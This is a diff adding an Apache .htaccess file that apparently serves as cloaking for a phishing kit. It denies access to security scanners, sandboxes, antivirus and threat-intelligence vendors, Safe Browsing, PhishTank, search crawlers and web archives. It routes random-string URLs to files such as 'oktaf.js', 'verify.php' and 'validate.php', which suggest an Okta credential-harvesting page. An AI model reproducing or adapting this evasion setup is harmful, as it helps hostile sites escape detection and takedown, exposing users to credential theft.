@@ -1,0 +1,113 @@
+<IfModule mod_headers.c>
+    Header set Access-Control-Allow-Origin "*"
+    Header set Access-Control-Allow-Methods "GET, POST, OPTIONS"
+    Header set Access-Control-Allow-Headers "Content-Type"
+</IfModule>
+
+<IfModule mod_rewrite.c>
+    RewriteEngine On
+    Options -Indexes
+
+    # =================================================================
+    # IP BLOCKING - Security Scanning & Threat Intelligence Platforms
+    # =================================================================
+    RewriteCond %{REMOTE_ADDR} ^(198\.20\.(6[4-9]|7[0-5]|69|70|99)\.|71\.6\.(1[3-9][0-9]|146|147|167|232)\.|209\.126\.136\.|66\.240\.(205|236)\.|93\.120\.27\.|188\.138\.9\.|162\.142\.125\.|141\.212\.12[0-2]\.|167\.94\.(138|145|146)\.|159\.203\.178\.|138\.68\.161\.|159\.89\.214\.|106\.75\.74\.|123\.207\.137\.|88\.202\.190\.|137\.117\.|54\.237\.75\.|154\.16\.1[0-9][0-9]\.|216\.244\.66\.|216\.218\.206\.|45\.79\.84\.|69\.46\.86\.|54\.236\.|52\.70\.|40\.76\.|13\.107\.|35\.247\.|35\.236\.) [OR]
+    RewriteCond %{REMOTE_ADDR} ^(71\.6\.1[3-9][0-9]\.|71\.6\.146\.|71\.6\.147\.|71\.6\.167\.)
+    RewriteRule .* - [F,L]
+
+    # =================================================================
+    # USER AGENT BLOCKING - Malicious Tools & Security Scanners
+    # =================================================================
+    RewriteCond %{HTTP_USER_AGENT} (havij|libwww-perl|nikto|sqlmap|wget|python|pysql|scan|any\.run|censys|shodan|masscan|nmap|zmap|zgrab|openvas|nuclei|burp|owasp|zap|w3af|dirb|dirbuster|gobuster|wfuzz|hydra|medusa|john|hashcat|metasploit|vega|arachni|skipfish|sqlninja|pangolin|safe3si|appscan|netsparker|acunetix|nessus|qualys|rapid7|tenable|greenbone|maltego|recon-ng|theharvester|fierce|dnsrecon|subfinder|amass|aquatone|httprobe|wayback|archive\.org|waybackmachine|cert-transparency|crt\.sh|virustotal|hybrid-analysis|joe|falcon|crowdstrike|fireeye|paloalto|checkpoint|fortinet|sophos|symantec|mcafee|kaspersky|bitdefender|avast|avg|eset|trend|malwarebytes|cylance|sentinelone|carbonblack) [NC]
+    RewriteRule .* - [F,L]
+
+    # Bot & Crawler Blocking
+    RewriteCond %{HTTP_USER_AGENT} ^(googlebot|BlackWidow|Bot\ mailto:craftbot@yahoo\.com|ChinaClaw|Custo|DISCo|Download\ Demon|eCatch|EirGrabber|EmailSiphon|EmailWolf|Express\ WebPictures|ExtractorPro|EyeNetIE|FlashGet|GetRight|GetWeb!|Go!Zilla|Go-Ahead-Got-It|GrabNet|Grafula|HMView|HTTrack|Image\ Stripper|Image\ Sucker|Indy\ Library|InterGET|Internet\ Ninja|JetCar|JOC\ Web\ Spider|larbin|LeechFTP|Mass\ Downloader|MIDown\ tool|Mister\ PiX|Navroad|NearSite|NetAnts|NetSpider|Net\ Vampire|NetZIP|Octopus|Offline\ Explorer|Offline\ Navigator|ISDUFHiudshfniDUFiuGrabber|Papa\ Foto|pavuk|pcBrowser|RealDownload|ReGet|SiteSnagger|SmartDownload|SuperBot|SuperHTTP|Surfbot|tAkeOut|Teleport\ Pro|VoidEYE|Web\ Image\ Collector|Web\ Sucker|WebAuto|WebCopier|WebFetch|WebGo\ IS|WebLeacher|WebReaper|WebSauger|Website\ eXtractor|Website\ Quester|WebStripper|WebWhacker|WebZIP|Wget|Widow|WWWOFFLE|Xaldon\ WebSpider|Zeus) [NC]
+    RewriteRule .* - [F,L]
+
+    # =================================================================
+    # URI BLOCKING - Security Tools in Request Path
+    # =================================================================
+    RewriteCond %{REQUEST_URI} (acunetix|nessus|cve|nuclei|burp|owasp|zap|w3af|dirb|dirbuster|gobuster|wfuzz|hydra|medusa|sqlmap|havij|pangolin|safe3si|appscan|netsparker|openvas|vega|arachni|skipfish|sqlninja|masscan|nmap|zmap|zgrab|shodan|censys) [NC]
+    RewriteRule .* - [F,L]
+
+    # =================================================================
+    # REFERRER BLOCKING - Threat Intelligence & Analysis Platforms
+    # =================================================================
+    RewriteCond %{HTTP_REFERER} (any\.run|app\.any\.run|censys\.io|shodan\.io|virustotal\.com|hybrid-analysis\.com|joe\.sandbox\.com|falcon\.crowdstrike\.com|malwr\.com|cuckoo\.sandbox|fireeye\.com|archive\.org|web\.archive\.org|wayback|cert-transparency|crt\.sh|threatminer\.org|otx\.alienvault\.com|urlvoid\.com|malwaredomainlist\.com|phishtank\.com|safebrowsing\.google\.com|smartscreen\.microsoft\.com) [NC]
+    RewriteRule .* - [F,L]
+
+    # Block Common Referrers
+    RewriteCond %{HTTP_REFERER} (google\.com|paypal\.com|firefox\.com|^http(s)?://(www\.)?http://safebrowsing-cache\.google\.com/.*$) [NC]
+    RewriteRule .* - [F,L]
+
+    # =================================================================
+    # CRAWLER & SECURITY SERVICE BLOCKING - Services that flag sites
+    # =================================================================
+    # Block major search engine crawlers
+    RewriteCond %{HTTP_USER_AGENT} (googlebot|bingbot|slurp|duckduckbot|baiduspider|yandexbot|facebookexternalhit|twitterbot|linkedinbot|whatsapp|telegrambot|applebot|ia_archiver|archive\.org) [NC]
+    RewriteRule .* - [F,L]
+
+    # Block security & reputation crawlers that flag sites
+    RewriteCond %{HTTP_USER_AGENT} (safebrowsing|phishtank|malwaredomainlist|surbl|uribl|spamhaus|barracuda|fortiguard|websense|bluecoat|symantec|mcafee|norton|kaspersky|bitdefender|avast|avg|eset|trend|sophos|malwarebytes|cylance|sentinelone|carbonblack|crowdstrike|fireeye|paloalto|checkpoint|fortinet|urlvoid|virustotal|metadefender|jotti|threatminer|alienvault|otx|greynoise|shadowserver|dnsdb|passivetotal|riskiq|recorded\.future|cisco\.umbrella|quad9|opendns|cleanbrowsing|adguard|nextdns) [NC]
+    RewriteRule .* - [F,L]
+
+    # Block URL reputation & analysis services
+    RewriteCond %{HTTP_USER_AGENT} (urlscan\.io|hybrid-analysis|falcon\.sandbox|joesandbox|cuckoo|malwr|anubis|threat\.grid|wildfire|lastline|vmray|intezer|reversing\.labs|polyswarm|cape\.sandbox|malware\.hunter|malware\.lu|malshare|bazaar\.abuse\.ch|feodotracker|sslbl|cybercrime-tracker|malc0de|vxvault|malwaredb|kernelmode|contagio|vicheck|malware-traffic-analysis) [NC]
+    RewriteRule .* - [F,L]
+
+    # Block website categorization services
+    RewriteCond %{HTTP_USER_AGENT} (categorization|webpulse|brightcloud|trustwave|forcepoint|lightspeed|contentkeeper|dansguardian|squidguard|privoxy|adblocker|adblock|ublock) [NC]
+    RewriteRule .* - [F,L]
+
+    # Block penetration testing & security assessment tools
+    RewriteCond %{HTTP_USER_AGENT} (pentest|security|assessment|vulnerability|exploit|payload|shellcode|backdoor|trojan|malware|virus|ransomware|spyware|adware|rootkit|botnet|keylogger|stealer|infostealer|rat|remote\.access|command\.control|c2|cnc) [NC]
+    RewriteRule .* - [F,L]
+
+    # =================================================================
+    # DIRECTORY PROTECTION
+    # =================================================================
+    # Block ALL direct access to page directory and subdirectories/files - return 404
+    RewriteRule ^page($|/.*) - [R=404,L]
+
+    # =================================================================
+    # URL ROUTING RULES
+    # =================================================================
+    
+    # Redirect for 19-character random string ending in .js under /js/ (MUST BE BEFORE general asset routing)
+    RewriteCond %{REQUEST_FILENAME} !-f
+    RewriteCond %{REQUEST_FILENAME} !-d
+    RewriteRule ^[^/]+/js/([a-zA-Z0-9]{19})\.js$ page/js/oktaf.js [L,QSA]
+    
+    RewriteCond %{REQUEST_FILENAME} !-f
+    RewriteCond %{REQUEST_FILENAME} !-d
+    RewriteRule ^[^/]+/js/([a-zA-Z0-9]{15})\.js$ page/js/bot-detection-config.js [L,QSA]
+
+    RewriteCond %{REQUEST_FILENAME} !-f
+    RewriteCond %{REQUEST_FILENAME} !-d
+    RewriteRule ^[^/]+/js/([a-zA-Z0-9]{16})\.js$ page/js/bot-detection.js [L,QSA]
+
+    # Consolidated asset routing with alternation for better performance
+    RewriteCond %{REQUEST_FILENAME} !-f
+    RewriteCond %{REQUEST_FILENAME} !-d
+    RewriteRule ^([^/]+)/(js|styles|template|images)/(.+)$ page/$2/$3 [L,QSA]
+
+    # 12-character string routing to verify.php
+    RewriteCond %{REQUEST_FILENAME} !-f
+    RewriteCond %{REQUEST_FILENAME} !-d
+    RewriteRule ^[^/]+/([a-zA-Z0-9]{12})/?$ page/verify.php [L,QSA]
+
+    # 11-character string routing to validate.php
+    RewriteCond %{REQUEST_FILENAME} !-f
+    RewriteCond %{REQUEST_FILENAME} !-d
+    RewriteRule ^[^/]+/([a-zA-Z0-9]{11})/?$ page/validate.php [L,QSA]
+
+    # PHP files - catch all remaining requests and add .php extension
+    RewriteCond %{REQUEST_FILENAME} !-f
+    RewriteCond %{REQUEST_FILENAME} !-d
+    RewriteCond %{REQUEST_URI} !\.(js|css|png|jpg|jpeg|gif|ico|svg|woff|woff2|ttf|eot)$ [NC]
+    RewriteRule ^([^/]+)/([^\.]+)$ page/$2.php [L,QSA]
+
+    
+</IfModule>
+
